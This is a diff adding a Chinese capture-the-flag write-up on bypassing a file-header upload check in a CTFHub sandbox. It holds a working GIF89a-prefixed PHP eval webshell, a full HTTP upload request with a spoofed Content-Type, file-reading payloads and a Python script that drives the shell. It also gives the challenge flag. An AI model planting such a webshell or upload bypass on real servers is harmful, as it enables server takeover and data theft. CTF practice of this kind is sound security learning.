@@ -1688,3 +1688,148 @@ t0ur1st=var_dump(file_get_contents('/var/www/html/flag_244514578.php'));
 提交`ctfhub{2ad7cbd9c7842379921777fc}`即可。
 
 ------
+
+### 文件头检查
+
+文件头检查，也称为魔术数字（Magic Number）检查或文件签名验证，其核心原理是：通过读取文件最开头的几个字节（通常是前8到20个字节），将其与已知的、标准的图片格式的固定签名进行比对，来判断该文件的真实类型。这种方法不依赖于文件的扩展名（如 `.jpg`，`.png`），因为扩展名极易被篡改，文件头检查方法检查的是文件内容的实际结构。
+
+由前面几道文件上传题，我们可知前端验证、扩展名限制和MIME类型等加固方法都不可靠：
+
+- 扩展名欺骗：攻击者可以将一个恶意的PHP脚本（shell.php）重命名为 shell.jpg.php 或直接修改扩展名为 .jpg。如果服务器只检查扩展名，就会误以为这是一个图片文件。
+- 客户端验证可绕过：客户端的所有验证（JavaScript、HTML）都可以被攻击者通过Burp Suite等工具拦截并修改请求来轻松绕过。
+- MIME类型不可靠：HTTP请求中的 Content-Type 头（如 image/jpeg）也是由客户端浏览器生成的，同样可以被恶意篡改。
+
+因此，蓝队在加固时认为必须在**服务器端**对上传文件的真实内容进行验证，而文件头检查就是第一道防线。当然，如果只检查文件头也是不安全的，这道题就是考察如何绕过文件头检查。
+
+**常见的图片文件头**
+
+| 图片格式 |   文件扩展名    |                  魔术数字（十六进制文件头）                  |
+| :------: | :-------------: | :----------------------------------------------------------: |
+| **JPEG** | `.jpg`, `.jpeg` |       `FF D8 FF E0` 或 `FF D8 FF E1` 或 `FF D8 FF E8`        |
+| **PNG**  |     `.png`      |                  `89 50 4E 47 0D 0A 1A 0A`                   |
+| **GIF**  |     `.gif`      | `47 49 46 38 37 61` 或 `47 49 46 38 39 61`<br />即ASCII字符`GIF87a` , `GIF89a` |
+
+以`GIF`后缀的文件为例，**我们需要检查目标文件的前6个字节是否完全匹配上述序列中的任一文件头。**
+
+`.gif`后缀文件，十六进制 (Hex)：`47 49 46 38 39 61`，ASCII字符`GIF89a`，这6个字节直接构成文件头标识字符串`GIF89a`。
+
+回到题目，打开靶机，编写`PHP`一句话木马文件。我们在这里写入`GIF89a`，就不需要抓包后再加了。
+
+```php
+GIF89a
+<?php @eval($_POST['t0ur1st']); ?>
+```
+
+如果直接上传`.php`文件，靶机会显示：
+
+> 文件类型不正确, 只允许上传 jpeg jpg png gif 类型的文件
+
+用`burp suite`修改HTTP请求中的MIME类型`Content-Type: image/jpeg`。
+
+```
+POST / HTTP/1.1
+Host: challenge-215f737f07351ff0.sandbox.ctfhub.com:10800
+Content-Length: 334
+Cache-Control: max-age=0
+Origin: http://challenge-215f737f07351ff0.sandbox.ctfhub.com:10800
+Content-Type: multipart/form-data; boundary=----WebKitFormBoundaryCJTHJXBoTpXy9pMG
+Upgrade-Insecure-Requests: 1
+User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/143.0.0.0 Safari/537.36
+Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7
+Referer: http://challenge-215f737f07351ff0.sandbox.ctfhub.com:10800/
+Accept-Encoding: gzip, deflate, br
+Accept-Language: zh-CN,zh;q=0.9,en-US;q=0.8,en;q=0.7
+Connection: keep-alive
+
+------WebKitFormBoundaryCJTHJXBoTpXy9pMG
+Content-Disposition: form-data; name="file"; filename="1.php"
+Content-Type: image/jpeg
+
+GIF89a
+<?php @eval($_POST['t0ur1st']); ?>
+------WebKitFormBoundaryCJTHJXBoTpXy9pMG
+Content-Disposition: form-data; name="submit"
+
+Submit
+------WebKitFormBoundaryCJTHJXBoTpXy9pMG--
+```
+
+文件上传成功后，靶机显示信息如下：
+
+> 上传文件相对路径
+> upload/1.php
+
+用`AntSword`连接木马文件，控制靶机后可以在`/var/www/html/flag_511724942.php`中看到`flag`。
+
+或者可以用`HackBar`构造`POST`请求。在常见的位置查找`flag`文件。
+
+```php
+t0ur1st=var_dump(array_merge(
+    glob('*/flag*'),
+    glob('/home/*/*flag*'),
+    glob('/var/www/*/*flag*'),
+    glob('/tmp/*flag*')
+));
+```
+
+靶机信息如下：
+
+> GIF89a array(1) { [0]=> string(32) "/var/www/html/flag_511724942.php" }
+
+查看`flag`文件内容。
+
+```php
+t0ur1st=var_dump(file_get_contents('/var/www/html/flag_511724942.php'));
+```
+
+右键查看网页源码，在注释中可以找到`flag`。
+
+> GIF89a
+> string(42) "<?php // ctfhub{becfee4f61d8fedf783838d9}
+> "
+
+因为文件上传题经常需要构造`POST`请求连接木马文件控制靶机，所以我编写了一个`python`初代脚本。
+
+```python
+import requests
+import re
+
+url = 'http://challenge-215f737f07351ff0.sandbox.ctfhub.com:10800/upload/1.php'
+payload_find = "var_dump(array_merge(glob('*/flag*'), glob('/home/*/*flag*'), glob('/var/www/*/*flag*'), glob('/tmp/*flag*')));"
+response1 = requests.post(url, data={"t0ur1st": payload_find})
+print("=== Find flag files ===")
+print(response1.text)
+
+match = re.search(r'string\(\d+\)\s+"([^"]+)"', response1.text)
+if match:
+    flag_path = match.group(1)
+    print("Found flag file:", flag_path)
+    payload_read = f"var_dump(file_get_contents('{flag_path}'));"
+    response2 = requests.post(url, data={"t0ur1st": payload_read})
+    print("\n=== Read flag content ===")
+    print(response2.text)
+else:
+    print("No flag path found.")
+```
+
+`python`代码运行结果如下：
+
+```bash
+=== Find flag files ===
+GIF89a
+array(1) {
+  [0]=>
+  string(32) "/var/www/html/flag_511724942.php"
+}
+
+Found flag file: /var/www/html/flag_511724942.php
+
+=== Read flag content ===
+GIF89a
+string(42) "<?php // ctfhub{becfee4f61d8fedf783838d9}
+"
+```
+
+提交`ctfhub{becfee4f61d8fedf783838d9}`即可。
+
+------
